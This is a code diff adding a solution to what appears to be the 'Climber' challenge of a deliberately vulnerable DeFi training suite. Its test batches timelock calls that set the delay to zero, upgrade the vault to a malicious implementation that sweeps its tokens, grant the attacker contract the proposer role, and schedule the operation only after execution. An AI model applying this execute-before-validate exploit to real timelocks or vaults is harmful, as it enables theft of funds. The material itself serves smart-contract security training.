@@ -7,6 +7,7 @@ import {ClimberVault} from "../../src/climber/ClimberVault.sol";
 import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+import {MaliciousClimber} from "../../src/climber/MaliciousClimber.sol";
 
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -85,7 +86,52 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+        MaliciousClimber malClimber = new MaliciousClimber();
+
+        address[] memory targets = new address[](4);
+        uint256[] memory values = new uint256[](4);
+        bytes[] memory calldataElements = new bytes[](4);
+        bytes32 salt = bytes32("0x");
+
+        targets[0] = address(timelock);
+        values[0] = 0;
+        calldataElements[0] = abi.encodeWithSelector(timelock.updateDelay.selector, uint64(0));
+
+        targets[1] = address(vault);
+        values[1] = 0;
+        calldataElements[1] = abi.encodeWithSelector(
+            vault.upgradeToAndCall.selector,
+            address(malClimber),
+            abi.encodeWithSelector(
+                MaliciousClimber.sendFundsToRecovery.selector, address(recovery), address(token), VAULT_TOKEN_BALANCE
+            )
+        );
+
+        targets[2] = address(timelock);
+        values[2] = 0;
+        calldataElements[2] = abi.encodeWithSelector(timelock.grantRole.selector, PROPOSER_ROLE, address(malClimber));
+
+        targets[3] = address(malClimber);
+        values[3] = 0;
+        calldataElements[3] = abi.encodeWithSelector(
+            malClimber.scheduleOp.selector,
+            address(timelock),
+            address(vault),
+            address(recovery),
+            address(token),
+            VAULT_TOKEN_BALANCE
+        );
+
+        timelock.execute(targets, values, calldataElements, salt);
+
+        //[
+        // 0) timelock.updateDelay(0),
+        // 1) vault.upgradeToAndCall(malicious, sendFundsToReocvery()),
+        // 2) timelock.grantRole(PROPOSER, maliciousClimber)
+        // 3) maliciousClimber.scheduleOp(...)
+        //      - recreates targets, values, dataElements.
+        //      - schedules it.
+        //]
     }
 
     /**
